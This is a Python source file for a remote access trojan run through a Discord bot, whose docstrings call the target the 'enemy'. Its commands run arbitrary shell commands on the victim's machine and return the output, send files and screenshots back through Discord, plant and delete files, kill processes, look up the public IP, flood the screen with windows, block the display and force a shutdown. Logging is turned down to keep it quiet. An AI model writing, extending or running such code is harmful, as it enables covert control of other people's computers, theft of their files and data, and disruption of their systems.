import discord
from discord.ext import commands
import tkinter as tk
import requests
import webbrowser
import platform
import psutil
import os
import logging
import asyncio
import subprocess
import pyautogui
import io


intents = discord.Intents.all()


bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

logging.basicConfig(level=logging.CRITICAL)


logging.basicConfig(level=logging.ERROR)


logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.ext.commands').setLevel(logging.CRITICAL)


logging.getLogger('discord.client').setLevel(logging.ERROR)
logging.getLogger('discord.gateway').setLevel(logging.ERROR)


def display_message(message):
    root = tk.Tk()
    root.title("Message")
    label = tk.Label(root, text=message)
    label.pack()
    root.mainloop()


def get_ip():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data.get('ip')
    except Exception as e:
        print(f"Error getting IP address: {e}")
        return None


@bot.command()
async def ip(ctx):
    """Shows ip address"""
    ip_address = get_ip()
    if ip_address:
        await ctx.send(f"The computer Ip address is: {ip_address}")
    else:
        await ctx.send("Sorry, I couldn't retrieve your IP address.")


@bot.command()
async def message(ctx, *, message):
    """Pops up a window at enemys computer with message"""

    display_message(message)


@bot.command()
async def redirect(ctx, *, website):
    """Redirects enemys computer to another website"""
    try:

        if not website.startswith('http://') and not website.startswith('https://'):
            await ctx.send("Please include 'http://' or 'https://' in the URL.")
            return
        webbrowser.open(website)
        await ctx.send(f"Redirecting to {website}")
    except Exception as e:
        await ctx.send(f"Error redirecting to {website}: {e}")

@bot.command()
async def info(ctx):
    """Shows computers info"""
    system_info = f"System: {platform.system()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"

    await ctx.send(f"```{system_info}```")


@bot.command()
async def list(ctx):
    """Shows running proccesses in a list"""
    running_processes = ""
    for process in psutil.process_iter():
        try:
            process_info = process.as_dict(attrs=['pid', 'name'])
            running_processes += f"PID: {process_info['pid']}, Name: {process_info['name']}\n"
        except psutil.NoSuchProcess:
            pass
    if running_processes:
        await ctx.send(f"```{running_processes}```")
    else:
        await ctx.send("No running processes found.")


@bot.command()
async def kill(ctx, pid: int):
    """Kills the programm with the pid"""
    try:
        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate()
        await ctx.send(f"Process with PID {pid} ({process_name}) has been terminated.")
    except psutil.NoSuchProcess:
        await ctx.send(f"No process found with PID {pid}.")


def list_files():
    file_list = ""
    for i, file in enumerate(os.listdir()):
        file_list += f"{i+1}. {file}\n"
    return file_list


@bot.command()
async def files(ctx):
    """Shows all files"""
    files = list_files()
    await ctx.send(f"```{files}```")


@bot.command()
async def download(ctx, number: int):
    """Allows you to download a file from the enemys computer"""
    files = os.listdir()
    if 1 <= number <= len(files):
        file_name = files[number - 1]
        with open(file_name, 'rb') as file:
            await ctx.send(file=discord.File(file))
    else:
        await ctx.send("Invalid file number.")


@bot.command()
async def upload(ctx):
    """Allows you to upload a file into enemys computer"""
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach a file to upload.")
        return

    attachment = ctx.message.attachments[0]
    file_name = attachment.filename

    try:
        await attachment.save(file_name)
        await ctx.send(f"File '{file_name}' has been uploaded.")
    except Exception as e:
        await ctx.send(f"Error uploading file: {e}")


@bot.command()
async def delete(ctx, number: int):
    """Deletes file"""
    files = os.listdir()
    if 1 <= number <= len(files):
        file_name = files[number - 1]
        try:
            os.remove(file_name)
            await ctx.send(f"File '{file_name}' has been deleted.")
        except Exception as e:
            await ctx.send(f"Error deleting file: {e}")
    else:
        await ctx.send("Invalid file number.")


@bot.command()
async def rename(ctx, number: int, new_name: str):
    """renames the file"""
    files = os.listdir()
    if 1 <= number <= len(files):
        old_file_name = files[number - 1]
        try:
            os.rename(old_file_name, new_name)
            await ctx.send(f"File '{old_file_name}' has been renamed to '{new_name}'.")
        except Exception as e:
            await ctx.send(f"Error renaming file: {e}")
    else:
        await ctx.send("Invalid file number.")


@bot.command()
async def help(ctx):
    """Shows this message"""
    help_message = "This is a list of available commands and their descriptions:\n\n"
    for command in bot.commands:
        if command.help:  
            help_message += f"**!{command.name}**: {command.help}\n"
        else:
            help_message += f"**!{command.name}**: No description available\n"

    await ctx.send(help_message)



nuke_task = None


def display_window():
    root = tk.Tk()
    root.title("Nuke")
    label = tk.Label(root, text="Nuke is activated!")
    label.pack()
    root.mainloop()


@bot.command()
async def nuke(ctx):
    """Opens window until you type again !nuke"""
    global nuke_task
    if nuke_task and not nuke_task.done():
        nuke_task.cancel()
        await ctx.send("Nuke deactivated!")
        nuke_task = None
    else:
        await ctx.send("Nuke activated! Windows will be opened every second until you type !nuke again.")
        nuke_task = bot.loop.create_task(run_nuke())


async def run_nuke():
    while True:
        display_window()
        await asyncio.sleep(0.1)  


@bot.command()
async def shell(ctx, *, command):
    """Run a command in you enemys terminal"""
    try:
 
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

     
        with open('output.txt', 'w') as f:
            f.write(f"Command: {command}\n")
            f.write(f"Output:\n{result.stdout}\n")
            f.write(f"Error:\n{result.stderr}\n")

        await ctx.send(file=discord.File('output.txt'))


        subprocess.run('rm output.txt', shell=True)

    except Exception as e:
        await ctx.send(f"Error executing command: {e}")


blocking_window = None
reopen_window = True


async def block_window():
    global blocking_window, reopen_window
    while reopen_window:
        blocking_window = tk.Tk()
        blocking_window.attributes('-fullscreen', True)  
        blocking_window.after(1000, lambda: destroy_window(blocking_window))  
        blocking_window.mainloop()
        await asyncio.sleep(0.1)  


def destroy_window(window):
    if window:
        try:
            window.destroy()
        except tk.TclError:
            pass


@bot.command()
async def block(ctx):
    """Blocks you enemys keyboard and mouse"""
    global blocking_window, reopen_window
    if not blocking_window:
        await ctx.send("Blocking window opened.")
        await block_window()
    else:
        destroy_window(blocking_window)
        blocking_window = None
        if reopen_window:
            reopen_window = False
            await ctx.send("Blocking window closed.")
        else:
            reopen_window = True
            await ctx.send("Blocking window restarted.")


@bot.command()
async def unblock(ctx):
    """Unblocks you enemys Keyboard and Mouse"""
    global reopen_window
    reopen_window = False
    await ctx.send("Blocking window stopped.")

@bot.command()
async def invite(ctx):
    """Invite link for the bot"""
    await ctx.send(f"[Invite link](<https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=34816&scope=bot>)")

@bot.command()
async def stop(ctx):
    """Stops the bot"""
    await ctx.send("Stopping the bot...")
    await bot.close()


@bot.command()
async def create(ctx, file_name: str):
    """Create file"""
    file_path = f"{file_name}"
    if os.path.exists(file_path):
        await ctx.send(f"A file with the name '{file_name}' already exists.")
    else:
        with open(file_path, 'w'):
            pass  
        await ctx.send(f"File '{file_name}' created successfully.")

@bot.command()
async def screenshot(ctx):
    """Makes a screenshot"""

    screenshot = pyautogui.screenshot()


    with io.BytesIO() as image_binary:
        screenshot.save(image_binary, format='PNG')
        image_binary.seek(0)
        file = discord.File(fp=image_binary, filename="screenshot.png")


        await ctx.send(file=file)


@bot.command()
async def shutdown(ctx):
    """Shutdown the pc"""
    await ctx.send("Shutting down the PC...")
    os.system("shutdown /s /t 1")  


bot.run(os.environ['TOKEN'])
